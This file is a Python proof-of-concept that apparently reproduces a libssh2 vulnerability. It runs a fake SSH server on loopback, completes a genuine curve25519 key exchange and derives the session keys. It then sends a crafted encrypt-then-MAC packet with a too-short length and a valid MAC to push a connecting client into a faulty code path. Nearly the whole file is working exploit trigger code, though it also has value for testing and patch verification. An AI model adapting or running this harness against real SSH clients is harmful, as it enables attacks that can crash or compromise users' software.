#!/usr/bin/env python3
"""Minimal loopback-only SSH server used to drive a live libssh2 client into
transport_fullpacket() with an ETM short packet (CVE-2026-66035).

No external contact. All KEX, key derivation, AES-CTR and HMAC-SHA1 are done
with local primitives from the `cryptography` package.
"""
import argparse
import hashlib
import hmac
import os
import socket
import struct
import sys

from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

SERVER_BANNER = b"SSH-2.0-LabFakeSSH-1.0"

MSG_KEXINIT = 20
MSG_KEX_ECDH_INIT = 30
MSG_KEX_ECDH_REPLY = 31
MSG_NEWKEYS = 21
MSG_IGNORE = 2

KEX = b"curve25519-sha256"
HOSTKEY = b"ssh-ed25519"
CIPHER = b"aes128-ctr"
MAC = b"hmac-sha1-etm@openssh.com"


def s(b):
    return struct.pack(">I", len(b)) + b


def u32(n):
    return struct.pack(">I", n)


def recv_exact(sock, n):
    out = b""
    while len(out) < n:
        chunk = sock.recv(n - len(out))
        if not chunk:
            raise EOFError("short read")
        out += chunk
    return out


def read_packet(sock):
    hdr = recv_exact(sock, 4)
    plen = struct.unpack(">I", hdr)[0]
    if plen < 1 or plen > 35000:
        raise ValueError("bad packet_length %d" % plen)
    body = recv_exact(sock, plen)
    padlen = body[0]
    if padlen < 4 or padlen >= plen:
        raise ValueError("bad padding %d" % padlen)
    return hdr + body, body[1:plen - padlen]


def send_plaintext(sock, payload, blocksize=8):
    padlen = 4
    while (5 + len(payload) + padlen) % blocksize != 0:
        padlen += 1
    plen = 1 + len(payload) + padlen
    pkt = u32(plen) + bytes([padlen]) + payload + os.urandom(padlen)
    sock.sendall(pkt)
    return pkt


def hashseq(hf, key, seqno, data):
    return hmac.new(key, u32(seqno) + data, hf).digest()


def derive(K, H, letter, length):
    out = b""
    prev = b""
    while len(out) < length:
        if prev:
            prev = hashlib.sha256(K + H + prev).digest()
        else:
            prev = hashlib.sha256(K + H + letter + H).digest()
        out += prev
    return out[:length]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--mode", choices=["short", "safe"], default="short")
    ap.add_argument("--seqno", type=int, default=3)
    ap.add_argument("--packet-length", type=int, default=4)
    ap.add_argument("--client-banner", default="")
    args = ap.parse_args()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", args.port))
    srv.listen(1)
    print("LISTENING %d" % args.port, flush=True)
    conn, addr = srv.accept()
    conn.settimeout(12)

    try:
        # --- banner exchange ------------------------------------------------
        conn.sendall(SERVER_BANNER + b"\r\n")
        v_s = SERVER_BANNER
        cblob = b""
        while not cblob.endswith(b"\n"):
            cblob += conn.recv(1)
        v_c = cblob.strip(b"\r\n")
        print("BANNER C=%r" % v_c, flush=True)

        # --- KEXINIT --------------------------------------------------------
        i_s = (bytes([MSG_KEXINIT]) + os.urandom(16) +
               s(b",".join([KEX])) + s(b",".join([HOSTKEY])) +
               s(b",".join([CIPHER])) + s(b",".join([CIPHER])) +
               s(b",".join([MAC])) + s(b",".join([MAC])) +
               s(b"none") + s(b"none") + s(b"") + s(b"") +
               bytes([0]) + u32(0))
        send_plaintext(conn, i_s)
        _, i_c = read_packet(conn)
        print("KEXINIT C len=%d" % len(i_c), flush=True)

        # --- KEX (curve25519-sha256) ---------------------------------------
        _, init = read_packet(conn)
        if not init or init[0] != MSG_KEX_ECDH_INIT:
            raise ValueError("expected KEX_ECDH_INIT, got %r" % init[:1])
        q_c = init[5:5 + 32]
        if len(q_c) != 32:
            raise ValueError("bad Q_C length")

        host_priv = Ed25519PrivateKey.generate()
        host_pub = host_priv.public_key().public_bytes(
            Encoding.Raw, PublicFormat.Raw)
        k_s = s(HOSTKEY) + s(host_pub)

        srv_priv = X25519PrivateKey.generate()
        q_s = srv_priv.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)
        shared = srv_priv.exchange(
            __import__("cryptography.hazmat.primitives.asymmetric.x25519",
                       fromlist=["X25519PublicKey"]).X25519PublicKey.from_public_bytes(q_c))
        # libssh2 hashes K as an SSH mpint (4-byte length + big-endian bytes).
        k_mpint = s(b"\x00" + shared) if shared[0] & 0x80 else s(shared)

        H = hashlib.sha256(
            s(v_c) + s(v_s) + s(i_c) + s(i_s) + s(k_s) +
            s(q_c) + s(q_s) + k_mpint).digest()
        sig = host_priv.sign(H)
        sig_blob = s(HOSTKEY) + s(sig)   # libssh2 skips 19-byte header
        reply = (bytes([MSG_KEX_ECDH_REPLY]) + s(k_s) + s(q_s) + s(sig_blob))
        send_plaintext(conn, reply)

        send_plaintext(conn, bytes([MSG_NEWKEYS]))
        _, nk = read_packet(conn)
        if not nk or nk[0] != MSG_NEWKEYS:
            raise ValueError("expected client NEWKEYS, got %r" % nk[:1])
        print("NEWKEYS both directions done", flush=True)

        # --- derived s2c keys ----------------------------------------------
        iv_s2c = derive(k_mpint, H, b"B", 16)
        key_s2c = derive(k_mpint, H, b"D", 16)
        mac_s2c = derive(k_mpint, H, b"F", 20)
        print("H=%s" % H.hex(), flush=True)
        print("S2C_KEY=%s IV=%s MAC=%s" %
              (key_s2c.hex(), iv_s2c.hex(), mac_s2c.hex()), flush=True)

        enc = Cipher(algorithms.AES(key_s2c), modes.CTR(iv_s2c)).encryptor()
        keystream = enc.update(b"\x00" * 64)

        if args.mode == "short":
            plen = args.packet_length
            if plen > 61:
                raise ValueError("packet_length too large for this harness")
            # Choose first_block[0..3] = [0x00, 0x41, 0x42, 0x43].
            want = (bytes([0, 0x41, 0x42, 0x43]) + b"\x44" * 32)[:plen]
            ciphertext = bytes(a ^ b for a, b in zip(want, keystream[:plen]))
            wire_ciphertext = ciphertext
        else:
            payload = bytes([MSG_IGNORE]) + s(b"x" * 20)
            # libssh2's ETM decrypt path asserts (len % blocksize)==0 for the
            # remainder, so the encrypted portion must be a multiple of 16.
            plen = 48
            padlen = plen - 1 - len(payload)
            plain = bytes([padlen]) + payload + os.urandom(padlen)
            wire_ciphertext = bytes(a ^ b for a, b in zip(plain, keystream[:plen]))

        mac = hashseq(hashlib.sha1, mac_s2c, args.seqno,
                      u32(plen) + wire_ciphertext)[:20]
        pkt = u32(plen) + wire_ciphertext + mac
        print("SEND mode=%s seqno=%d packet_length=%d wire_bytes=%d" %
              (args.mode, args.seqno, plen, len(pkt)), flush=True)
        conn.sendall(pkt)
        # Give the client time to process, then close.
        import time
        time.sleep(3)
    except Exception as exc:
        print("SERVER_ERROR %r" % exc, flush=True)
        raise
    finally:
        conn.close()
        srv.close()


if __name__ == "__main__":
    main()
